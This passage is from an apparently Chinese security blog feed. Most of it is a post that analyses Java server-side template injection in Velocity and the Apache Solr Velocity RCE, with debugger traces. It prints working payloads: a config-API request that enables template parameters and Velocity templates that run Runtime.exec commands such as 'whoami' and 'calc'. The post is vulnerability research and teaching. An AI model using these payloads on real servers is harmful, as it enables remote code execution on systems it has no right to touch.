    <content type="html"><![CDATA[<p>&emsp;&emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。<br><img src="https://img-blog.csdnimg.cn/20200505201706460.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200505201642976.png" alt="在这里插入图片描述"></p><ol><li>先尝试去掉勾选 <code>Enable &#39;tostring0&#39; object view</code><blockquote><p>因为idea的debugger是默认会在内部将方法执行一次，然后回显提示数据，本意是很好，但有时候会干扰影响结果。</p></blockquote></li></ol><p><img src="https://img-blog.csdnimg.cn/20200505201349162.png" alt="在这里插入图片描述"></p><ol start="3"><li>如果还是不行就再去掉勾选<code>Enable alternative view for Collections classes</code>一定是可以的。<blockquote><p>idea默认在用户调试之前先执行<code>toString</code>方法，然后回显数据，也就是<code>“预知”</code>功能。但有时候会影响判断，但可以设置那些类中<code>toString</code>方法是是可以做<code>“预知”</code>。</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。&lt;br&gt;&lt;img src=&quot;https://img-blog.
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java debugger" scheme="http://yoursite.com/tags/Java-debugger/"/>
    
  </entry>
  
  <entry>
    <title>白头搔更短，SSTI惹人心！</title>
    <link href="http://yoursite.com/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/"/>
    <id>http://yoursite.com/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/</id>
    <published>2020-03-24T07:20:16.000Z</published>
    <updated>2020-05-06T07:19:31.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>为什么说Java审计南在SSTI呢？</strong></p><ol><li>现行SSTI(Server-Side Template Injection ) 资料不少，但与Java，以著名的先知社区为例（如下图所示），关于SSTI文章也不过几篇而已，但与Java相关的一篇都没有。<br><img src="https://img-blog.csdnimg.cn/2020031517280148.png" alt="在这里插入图片描述"></li><li>搜索CVE漏洞有关于SSTI的漏洞编号也不过只有几个而已。<br><img src="https://img-blog.csdnimg.cn/20200317133833592.png" alt="在这里插入图片描述"></li><li>如果你是一名老司机，已经挖过ssti漏洞，那你是否知道payload构造原理呢？本文为你解惑！老司机可以直接跳转到后记看本文，或者你只是想看payload构造原理亦如此，本文篇幅较长，建议先收藏。</li></ol><hr><h1 id="SSTI-服务端模板注入"><a href="#SSTI-服务端模板注入" class="headerlink" title="SSTI 服务端模板注入"></a>SSTI 服务端模板注入</h1><p>&emsp;&emsp; ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><img src="https://img-blog.csdnimg.cn/202003161429497.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span></span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="comment">// 使用Velocity</span></span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>POC</strong><br><code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Velocity.evaluate函数源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>设置断点开始调试</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316151247751.png" alt="在这里插入图片描述"></p><ul><li>进入Velocity.evaluate方法查看方法详情</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200316151614641.png" alt="在这里插入图片描述"></p><ul><li>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316152752486.png" alt="在这里插入图片描述"></p><ul><li>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316153220725.png" alt="在这里插入图片描述"></p><ul><li>进入StringReader看看</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316154323392.png" alt="在这里插入图片描述"></p><ul><li>在进入evaluate查看方法具体实现过程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer writer, String logTag, Reader reader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logTag == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            SimpleNode nodeTree = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 来到这里进行解析</span></span><br><span class="line">                nodeTree = <span class="keyword">this</span>.parse(reader, logTag);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var7, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateInitException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var8, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// 判断，然后进入this.render方法</span></span><br><span class="line">            <span class="keyword">return</span> nodeTree == <span class="keyword">null</span> ? <span class="keyword">false</span> : <span class="keyword">this</span>.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>继续跟进render方法</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161419209.png" alt="在这里插入图片描述"></p><ul><li>render方法里面还有一个render方法，真的是™烦。不过这个是simpleNodel类的render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161613552.png" alt="在这里插入图片描述"></p><ul><li><strong>高潮激情部分</strong>，由于前面两个没有什么用，让我们直接跳到第三个看，进入render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162015493.png" alt="在这里插入图片描述"></p><ul><li>在这里我们不能发现有一个execute方法，这就是罪魁祸首。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162552984.png" alt="在这里插入图片描述"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 截取的部分关键性源代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numChildren; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.strictRef &amp;&amp; result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            methodName = <span class="keyword">this</span>.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> VelocityException(<span class="string">"Attempted to access '"</span> + methodName + <span class="string">"' on a null value at "</span> + Log.formatFileString(<span class="keyword">this</span>.uberInfo.getTemplateName(), <span class="keyword">this</span>.jjtGetChild(i).getLine(), <span class="keyword">this</span>.jjtGetChild(i).getColumn()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        previousResult = result;</span><br><span class="line">                        result = <span class="keyword">this</span>.jjtGetChild(i).execute(result, context);</span><br><span class="line">                        <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.strictRef) &#123;</span><br><span class="line">                            failedChild = i;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</p></li><li><p>previousResult = result;首先这行代码使其它们保持一致</p></li><li><p>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE<br><img src="https://img-blog.csdnimg.cn/20200316155414726.png" alt="在这里插入图片描述"></p></li><li><p>完整的效果展示<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMTE0NTgwMS1mYjEyMzA5YjRjMDU5MmE2LmdpZg" alt></p></li><li><p>完整的调用链</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162402512.png" alt="在这里插入图片描述"></p><hr><h1 id="案例分析-—-Apache-solr-Velocity-模版注入"><a href="#案例分析-—-Apache-solr-Velocity-模版注入" class="headerlink" title="案例分析 — Apache solr Velocity 模版注入"></a>案例分析 — Apache solr Velocity 模版注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 这个漏洞是去年10月底爆出的漏洞，这里只做必要的简单复现，笔者在这篇文章里主要是分析，更加完整的<a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">漏洞复现过程</a>参考。</p><ol><li>第一步修改配置，开启Velocity模版里<code>VelocityResponseWriter</code>初始化参数的<code>params.resource.loader.enabled</code>选项，该选项默认是<code>false</code>。查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">W3Cschool solr官方文档</a>可知，solr是配置api可以进行查看配置、修改配置的。</li></ol><p>访问查看<code>http://127.0.0.1:8983/solr/test/config</code>配置信息<br><img src="https://img-blog.csdnimg.cn/20200321162727737.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317150202155.png" alt="在这里插入图片描述"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317151703268.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析环境搭建"><a href="#漏洞分析环境搭建" class="headerlink" title="漏洞分析环境搭建"></a>漏洞分析环境搭建</h2><p>&emsp;&emsp; 笔者在此是使用远程代码调试的方式，分析源码。<a href="https://archive.apache.org/dist/lucene/solr/8.2.0/" target="_blank" rel="noopener">源码下载地址</a>windows用户可以选择下载这两个，这里笔者下载下载第二个。（下载第一个需要编译，过程自行百度）<br><img src="https://img-blog.csdnimg.cn/20200317160246408.png" alt="在这里插入图片描述"></p><ol><li><p>解压，将源码导入idea中，并配置idea中远程代码调试。<br><img src="https://img-blog.csdnimg.cn/20200317160450347.png" alt="在这里插入图片描述"></p></li><li><p>在第二个下载压缩包路径CMD环境下（~~\solr-8.2.0\bin\），启动命令<code>solr start -p 8983 -f -a &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200317161340408.png" alt="在这里插入图片描述"></p></li><li><p>用idea打开项目，导入jar文件设置为library。（还有几处在solr-8.2.0\contrib\velocity\lib、solr-8.2.0\server\lib……）<br><img src="https://img-blog.csdnimg.cn/20200323143907966.png" alt="在这里插入图片描述"></p></li><li><p>打断点调试代码。分析一个web项目首先我们得看web.xml文件<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml</code>，看第一句，发现<code>在solrconfig.xml中注册的任何路径（名称）都将发送到该过滤器</code>。<br><img src="https://img-blog.csdnimg.cn/20200321153010735.png" alt="在这里插入图片描述"></p></li></ol><ul><li>断点位置，为什么会在这里打个断点，笔者翻阅资料得知这里是核心位置。具体参考<a href="https://my.oschina.net/haitaohu/blog/3078667" target="_blank" rel="noopener">solr源码阅读</a>。<br><img src="https://img-blog.csdnimg.cn/20200321154555773.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="漏洞成因分析-–-代码层"><a href="#漏洞成因分析-–-代码层" class="headerlink" title="漏洞成因分析 – 代码层"></a>漏洞成因分析 – 代码层</h2><h3 id="POC第一部分"><a href="#POC第一部分" class="headerlink" title="POC第一部分"></a>POC第一部分</h3><p>&emsp;&emsp; 第一部分分析请查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">Solr配置API：Config API</a>文档，文档中说明的很清楚。PS：漏洞复现的时候也有说明。<br><img src="https://img-blog.csdnimg.cn/2020032319153017.png?" alt="在这里插入图片描述"></p><hr><h3 id="POC后部分分析"><a href="#POC后部分分析" class="headerlink" title="POC后部分分析"></a>POC后部分分析</h3><ol><li>笔者这里直接说几个关键的部分代码<br>第一步先处理请求<br><img src="https://img-blog.csdnimg.cn/20200324135210989.png" alt="在这里插入图片描述"><ol start="2"><li><code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class</code>跳转到<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class</code> 先处理参数wt，设置为velocity。<br><img src="https://img-blog.csdnimg.cn/20200324140636319.png" alt="在这里插入图片描述"></li><li>写入响应<br><img src="https://img-blog.csdnimg.cn/202003241354181.png" alt="在这里插入图片描述"></li><li>判断方法，写查询响应，进一步查看内容。solrReuest就是我们的payload。<br><img src="https://img-blog.csdnimg.cn/2020032414122987.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141356198.png" alt="在这里插入图片描述"></li><li>跳转到velocityResponWriter.class,会创建velocity模板引擎。在到133行的位置进入模板方法<br><img src="https://img-blog.csdnimg.cn/20200324141530325.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141916156.png" alt="在这里插入图片描述"></li><li>在这里会跳转到SimpleNode.class类（我们熟悉的类），第一步会设置指引，接着会到ASTReference.class 在第八的位置，会遍历方法，会执行命令。<br><img src="https://img-blog.csdnimg.cn/20200324142424569.png" alt="在这里插入图片描述"></li><li>在这里会跳转到ASTMethod类中，执行。<br><img src="https://img-blog.csdnimg.cn/20200324143631629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200324143501469.png" alt="在这里插入图片描述"></li><li>具体执行是velocity模板引擎中有一个ClassMap类中。<br><img src="https://img-blog.csdnimg.cn/20200323201336890.png" alt="在这里插入图片描述"></li></ol></li></ol><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a><strong>知识补充</strong></h2><p>&emsp;&emsp; 在前面有涉及到JJTree、payload构造、JavaCC等知识，但笔者并没有详细的说明，笔者想先读者们简单了解一下这些知识，然后在说明一下简单做个简单说明。</p><h2 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a><strong>#set语法</strong></h2><p>&emsp;&emsp; #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h2 id="foreach语法"><a href="#foreach语法" class="headerlink" title="#foreach语法"></a><strong>#foreach语法</strong></h2><p>Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($child in $person.children) $person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><h2 id="JJTree渲染过程解析"><a href="#JJTree渲染过程解析" class="headerlink" title="JJTree渲染过程解析"></a><strong>JJTree渲染过程解析</strong></h2><p>下面是JJTree的语法树：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvOTkwNTMyLzIwMTYxMC85OTA1MzItMjAxNjEwMjUxNTI3NDM3NTAtMTA4MzgwODIyOC5wbmc?x-oss-process=image/format,png" alt></p><h2 id="关于POC构造方法补充说明"><a href="#关于POC构造方法补充说明" class="headerlink" title="关于POC构造方法补充说明"></a><strong>关于POC构造方法补充说明</strong></h2><p><strong>VelocityResponseWriter 初始化参数</strong></p><ul><li>template.base.dir<br>如果指定并作为文件系统目录存在，则将为此目录添加一个文件资源加载程序。此目录中的模板将覆盖 “solr” 资源加载程序模板。 </li><li>init.properties.file<br>指定一个属性文件名，必须存在于 Solr 的conf/目录（而不是在velocity/子目录中）或者 <lib> 的 JAR 文件的根中。 </lib></li><li>params.resource.loader.enabled<br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：</li></ul><p><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_namev.template=custom</code>表示要呈现一个名为“自定义”的模板，其值<code>v.template.custom</code>是自定义模板。默认情况下为<code>false</code>；它不常用，需要时启用。</p><ul><li>solr.resource.loader.enabled<br>“solr” 资源加载程序是默认注册的唯一模板加载程序。模板是由 SolrResourceLoader 从velocity/子目录下可见的资源提供的。VelocityResponseWriter 本身有一些内置的模板（在它 JAR 文件中的velocity/），这些模板可以通过这个加载程序自动使用。当相同的模板名称处于 conf/velocity/ 或使用template.base.dir选项时，可以覆盖这些内置模板。 </li></ul><hr><p><strong>VelocityResponseWriter请求参数</strong></p><ul><li><p>v.template<br>指定要呈现的模板的名称。</p></li><li><p>v.layout<br>指定一个模板名称，用作围绕主<code>v.template</code>指定模板的布局。<br>主模板呈现为包含在布局渲染中的字符串值$content。</p></li><li><p>v.layout.enabled<br>确定主模板是否应该有围绕它的布局。默认是<code>true</code>，但也需要指定<code>v.layout</code>。<br>v.contentType<br>指定 HTTP 响应中使用的内容类型。如果没有指定，默认取决于是否指定<code>v.json</code>。<br>默认情况下不包含<code>v.json=wrf：text/html;charset=UTF-8</code>。<br>默认为<code>v.json=wrf：application/json;charset=UTF-8</code>。</p></li><li><p>v.json<br>指定一个函数名称来包装呈现为 JSON 的响应。如果指定，则响应中使用的内容类型将为“application / json; charset = UTF-8”，除非被<code>v.contentType</code>覆盖。<br>输出将采用以下格式（带<code>v.json=wrf</code>）：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrf(&quot;result&quot;:&quot;&lt;Velocity generated response string, with quotes and backslashes escaped&gt;&quot;)</span><br></pre></td></tr></table></figure></li><li><p>v.locale<br>使用<code>$resource</code>工具和其他 LocaleConfig 实现工具的语言环境。默认语言环境是<code>Locale.ROOT</code>。本地化资源从名为<code>resources[_locale-code].properties</code>的标准 Java 资源包中加载<br>可以通过提供由 SolrResourceLoader 在速度子下的资源包可见的 JAR 文件来添加资源包。资源包不能在<code>conf/</code>下加载，因为只有 SolrResourceLoader 的类加载程序方面可以在这里使用。</p></li><li><p>v.template.template_name<br>当启用 “params” 资源加载程序时，可以将模板指定为 Solr 请求的一部分。<br><code>params.resource.loader.enabled</code><br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：<br><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_name</code></p></li></ul><hr><ol><li>先将poc进行解码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;#set($x&#x3D;&#39;&#39;) #set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;)) #set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;)) #set($ex&#x3D;$rt.getRuntime().exec(&#39;calc&#39;)) $ex.waitFor() #set($out&#x3D;$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure></li><li>set和foreach语法前面都介绍了，现在在看payload是不是就一目了然了？如何构造，为什么这么构造..<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x='')  </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime'))</span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character'))  </span><br><span class="line">#set($str=$x.class.forName('java.lang.String'))</span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031621445369.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200316214532444.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>附图：各框架模板结构：</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNS5zc2wucWhpbWcuY29tL3QwMWY0NzkyYzdkMDNkZDQ5Y2MucG5n?x-oss-process=image/format,png" alt></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>&emsp;&emsp; Apache Solr的<code>Config API</code>是自带功能，用于通过HTTP请求更改配置；当Solr未设置访问鉴权时，可以直接通过ConfigAPI更改配置，为漏洞利用创造了前提。config api是solr多此爆出漏洞关键<a href="https://github.com/Imanfeng/Apache-Solr-RCE" target="_blank" rel="noopener">Apache Solr RCE</a>有想法的童鞋可以看看这个项目。</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>&emsp;&emsp; 之前刚刚爆出漏洞的时候，笔者还曾复现过，但奈何能力有限，不能深入理解其中内涵。深表惭愧，总的来说，努力学习，安全一行任重而道远。</p><hr><h1 id="推荐学习资料"><a href="#推荐学习资料" class="headerlink" title="推荐学习资料"></a>推荐学习资料</h1><p>&emsp;&emsp; 想进行深入研究此漏洞肯定光看我这篇文章是不足的，毕竟我这这个只是Java方面上的，python、php等语言都没介绍。故此推荐，望彼有助。</p><p><strong>国内资料</strong></p><p>Python方面：<a 